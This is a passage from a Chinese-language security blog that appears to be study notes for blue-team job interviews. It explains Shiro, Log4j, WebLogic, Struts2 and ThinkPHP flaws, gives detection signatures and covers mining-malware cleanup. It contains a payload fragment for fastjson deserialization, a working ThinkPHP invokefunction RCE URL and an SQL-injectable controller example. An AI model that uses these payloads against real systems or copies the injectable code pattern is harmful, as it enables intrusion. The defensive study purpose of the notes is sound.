&#x27;_tfactory&#x27;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="14、shiro550反序列化"><a href="#14、shiro550反序列化" class="headerlink" title="14、shiro550反序列化"></a>14、shiro550反序列化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原理：</span><br><span class="line">导致shiro反序列化的主要原因就是shiro提供的记住密码功能，当用户打开这个功能时会在请求阿包中生成一个cookie，cookie的value值是经过反序列-&gt;aes加密-&gt;base64加密后的字符串，关键在于aes加密的秘钥是默认的，如果没有修改这个秘钥，就会导致反序列化漏洞，攻击者可以构造恶意代码，将恶意代码序列化-aes加密-base64加密后传入cookie，这样就导致RCE漏洞。</span><br><span class="line">特征：shiro是一个身份验证组件，一般用在登录模块，登录失败会有一个失败标识rememberme=deleteme，如果返回包中存在该字段则说明可能存在反序列化漏洞。</span><br></pre></td></tr></table></figure>

<h2 id="15、log4j漏洞"><a href="#15、log4j漏洞" class="headerlink" title="15、log4j漏洞"></a>15、log4j漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原理：log4j2框架下的lookup服务提供了&#123;&#125;字段解析功能，传进去的值会被直接解析，JNDI服务会请求远程服务来链接本地对象，这时候只用在&#123;&#125;里面调用JNDI服务即可反弹shell到指定服务器</span><br><span class="line">特征：数据包里有&#123;jndi:ladp//&#125;字段</span><br></pre></td></tr></table></figure>

<h2 id="16、中挖矿病毒怎么解决"><a href="#16、中挖矿病毒怎么解决" class="headerlink" title="16、中挖矿病毒怎么解决"></a>16、中挖矿病毒怎么解决</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">首先ps -aux查看进程分析</span><br><span class="line">然后top 分析算力，挖矿用到的算力比较多，对流量进行过滤，含有矿池服务器的流量就是挖矿病毒</span><br><span class="line">最后kill进程，rm掉程序</span><br><span class="line">删不掉这么办</span><br><span class="line">先下线，然后检查挖矿是否有在内网传播及时下线所有被传播的主机、上机排查攻击痕迹、一般可以从cpu占用情况，可以进程、开放端口、计划任务、服务项几个方面排查</span><br><span class="line">将样本上传到在线分析平台，清除挖矿主程序主要就是双向封禁矿池地址、删除计划任务自启动、删服务，结束恶意进程、删病毒</span><br><span class="line">删不掉：确认一下一下是因为程序在使用，还是权限不够，更具具体情况采取措施</span><br><span class="line">直接降权，降权到没有执行权限</span><br></pre></td></tr></table></figure>

<h2 id="17、weblogic-xml反序列化"><a href="#17、weblogic-xml反序列化" class="headerlink" title="17、weblogic xml反序列化"></a>17、weblogic xml反序列化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原理：xml反序列化，这是wls security组件对外提供的webserver页面，通过xmlDecoder功能来解析用户的xml数据导致的任意字符串被当做代码去执行</span><br><span class="line">特征：服务器开放7001端口  传递xml数到wls-wsat  数据包内容有bash或者dnslog字段。</span><br></pre></td></tr></table></figure>

<h2 id="18、weblogic命令执行如何回显"><a href="#18、weblogic命令执行如何回显" class="headerlink" title="18、weblogic命令执行如何回显"></a>18、weblogic命令执行如何回显</h2><h2 id="19、框架漏洞"><a href="#19、框架漏洞" class="headerlink" title="19、框架漏洞"></a>19、框架漏洞</h2><h4 id="stu2"><a href="#stu2" class="headerlink" title="stu2"></a>stu2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stu2-045：</span><br><span class="line">Struts2默认使用org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest 类对上传数据进行解析.JakartaMultiPartRequest类在处理Content-Type时如果获得非预期的值的话,将会抛出一个异常,对这个异常的处理会对错误信息进行OGNL表达式解析,从而造成了恶意代码执行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stu-061</span><br><span class="line">检测思路</span><br><span class="line">在新版本的struts2中，已经不能通过参数构造来解析ognl表达式了，所以如果考虑想要使用脚本来进行批量扫描是否有本漏洞的时候，可以考虑直接爆破所有参数，然后判断页面中是否有预计的结果文本即可。</span><br><span class="line">比如：</span><br><span class="line">​ %&#123; ‘gcowsec-‘ + (2000 + 20).toString()&#125;</span><br><span class="line">预计会得到</span><br><span class="line">​ gcowsec-2020</span><br><span class="line">使用脚本判断结果中是否包含就可以了</span><br><span class="line">此次漏洞只是S2-059修复的一个绕过，并且本次利用的核心类org.apache.commons.collections.BeanMap在commons-collections-x.x.jar包中，但是在官方的最小依赖包中并没有包含这个包。所以即使扫到了支持OGNL表达式的注入点，但是如果没有使用这个依赖包，也还是没办法进行利用。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stu-057</span><br><span class="line">漏洞产生于网站配置XML时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，从而导致远程代码执行漏洞的发生</span><br><span class="line">利用条件</span><br><span class="line">alwaysSelectFullNamespace被设置为true，此时namespace的值是从URL中获取的。URL是可控的，所以namespace也是可控的。</span><br><span class="line">action元素没有名称空间属性集，或者使用通配符。该名称空间将由用户从URL传递并解析为OGNL表达式，最终导致远程代码执行的脆弱性</span><br></pre></td></tr></table></figure>

<h4 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RCE</span><br><span class="line">ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</span><br><span class="line">http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SQL注入</span><br><span class="line">漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。</span><br><span class="line">index.php?ids[]=1&amp;ids[]=2</span><br><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $username = request()-&gt;get(&#x27;username&#x27;);</span><br><span class="line">        $result = db(&#x27;users&#x27;)-&gt;where(&#x27;username&#x27;,&#x27;exp&#x27;,$username)-&gt;select();</span><br><span class="line">        return &#x27;select success&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/22%E6%8A%A4%E7%BD%91%E8%93%9D%E5%88%9D%E9%9D%A2%E8%AF%95%E9%A2%982/" data-id="cljpcwhtt0000l8ez8k3c5bpx" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2023/07/05/%E5%B0%8F%E8%BF%AA2020/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2023/07/05/%E9%9D%B6/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/07/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%88%E4%BE%8B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/07/05/dvwa/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>